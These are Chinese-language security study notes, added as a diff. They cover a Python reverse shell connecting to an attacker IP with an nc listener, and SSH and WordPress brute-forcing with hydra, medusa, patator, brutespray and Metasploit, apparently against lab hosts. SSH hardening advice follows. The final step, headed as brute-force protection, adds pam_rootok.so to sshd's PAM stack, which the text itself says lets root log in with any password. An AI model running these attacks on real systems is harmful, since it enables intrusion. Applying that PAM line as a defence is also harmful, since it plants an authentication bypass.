@@ -1,0 +1,167 @@
+#####
+####关于反弹shell
+在目标主机运行这一条，其中的IP是要连接的攻击机IP，目标IP 129
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.218.130",5000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+在攻击机监听5000端口，获取socket连接攻击机IP 130
+ nc -lkvp 5000 #获取到root的权限。
+
+
+#ssh暴力破解。
+在线破解，，需要连接服务
+离线破解，，吧shadow文件dump下来。破解md5
+
+1.  hydra[海德拉]
+
+希腊神话九头蛇
+支持几乎所有协议的在线暴力破解。
+破解取决于passlist.txt文件
+e.g.:
+
+# hydra -l user -P passlist.txt ftp://192.168.0.1
+# hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
+# hydra -C defaults.txt -6 pop3s://[2001:db8::1]143/TLS:DIGEST-MD5
+# hydra -l admin -p password ftp://[192.168.0.1]/
+# hydra -L logins.txt -P pws.txt -M targets.txt ssh
+
+##hydra 破解dc-2。参考网页：https://blog.csdn.net/qq_41210745/article/details/103615317
+hydra -L 2.txt -P 1.txt dc-2 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+######
+e.g.
+# hydra -l root -P pass.dic 192.168.218.128 ssh
+
+
+
+#######
+2.medusa [美杜莎】
+
+medusa -M ssh -u root -P pass.txt -H host.txt  -t 10
+medusa -M ssh -u root -P pass.txt -H host.txt  -t 10 -F
+medusa -M ssh -u root -P pass.txt -H host.txt  -t 10 -O ssh-medusa.txt
+
+
+###########
+3. patator
+模块化。
+-h 查看参数
+# patator -h
+# patator ssh_login --help
+
+# patator ssh_login host=192.168.106.134 user=root password=FILE0 0=pass.txt
+# patator ssh_login host=192.168.106.134 user=root password=FILE0 0=pass.txt \
+-x ignore:mesg='Authentication failed'
+#FILE0或者FILE1 只是一个变量参数。0,1 直接指定文件。
+# patator ssh_login host=192.168.106.134 user=FILE1 1=user.txt password=FILE0 0=pass.txt
+
+
+
+
+
+
+###########
+4.BrutePray
+# apt-get install brutespray
+-h 帮助
+#使用nmap扫描提供brute的文件
+# nmap -p 22 -sV -O 10.134.196.21/24 -oX nmap.xml
+# brutespray --file nmap.xml -U user.txt -P pass.txt --threads 5 --hosts 5
+
+
+
+
+
+
+
+
+
+
+
+#########
+5.MSF
+ruby
+
+apt-get install metasploit-framework
+msfconsole
+先探测ssh的版本
+	use auxiliary/scanner/ssh/ssh_version
+	set rhosts 192.168.106.105  //对应unset取消。或者再set覆盖
+	show options
+	run
+
+msf> search ssh
+msf> use auxiliary/scanner/ssh/ssh_login
+	> set rhosts 192.168.106.105
+	> set USER_FILE /root/user.txt
+	> set PASS_FILE /root/pass.txt
+	> run
+如果太慢了，设置下线程数。THREADS
+
+
+
+
+
+
+
+
+
+
+##########
+6.暴力破解防御。
+1. useradd shell【推荐]
+# useradd yangge -s /sbin/nologin		使用不登录的shell模式
+	
+2. 密码复杂性【推荐]
+字母+数字+特殊字符+20位以上+定期更换
+	
+3. 修改默认端口,尽量不要使用低端口【推荐]
+	带d的是服务器配置文件。sshd，ssh
+	不带d是客户端配置文件、etc/ssh/ssh_config，其中第一次登陆需要的yes确认、在文件中搜索ask，
+	而且修改ssh_config文件后不用重启，只是个客户端。
+/etc/ssh/sshd_config
+Port 22222
+	
+4. 限制登陆的用户或者组【推荐]
+	不会用可以man 一下，man sshd_config
+#PermitRootLogin yes
+AllowUser yangge
+	
+4.使用sudo【推荐]
+#visudo
+、etc/sudoers文件，使用轮子组，从所有主机使用所有身份执行所有操作，，%wheel主机，身份，操作
+	
+5.设置允许的IP访问【可选】
+、etc/hosts.allow,例如 sshd：192.168.2.4：allow
+PAM基于IP的限制
+iptables/firewalld
+只能允许从堡垒机,即跳板机。
+
+	
+6. 使用DenyHosts自动统计自动检测登录次数，失败3次即加入到deny名单，并将其加入到/etc/hosts.deny，早期的功能
+
+7. 基于PAM实现登良路限制【推荐]
+模块：pam_tally2.so
+功能：登录统计
+实例：实现ssh防止暴力破解
+# grep  tally2 /etc/pam.d/sshd ，在文件下插入这一行
+auth 	required	pam_tally2.so	deny=2	even_deny_root root_unlock_time=60	unlock_time=6
+使用这种方式连续两次破解失败就会设置锁定时间，最好5分钟。300s，
+8. 禁用密码改用公钥方式验证
+/etc/ssh/sshd_config
+PasswordAuthentication no
+
+9.保护xshell导出会话文件【小心】
+xshell软件中保存的密码文件导出，再导入，只针对密码登录，公钥登录需要公钥，私钥，私钥密码才可以
+
+10.GRUB加密{针对本地破解}
+
+
+
+实例：实现ssh防止暴力破解
+比如root账户切换普通账户时不需要输入密码，所以可以利用这点
+查看/etc/pam.d/su文件
+复制如下一行到sshd下。
+vim /etc/pam.d/sshd,添加
+auth 	sufficient	pam_rootok.so			#意思是只要是root账户，就有充分的权限，
+
+远程连接ssh时，root账户，密码随便输入，即可认证登入，不输入不行，需要提供一串字符作为密码登录
+
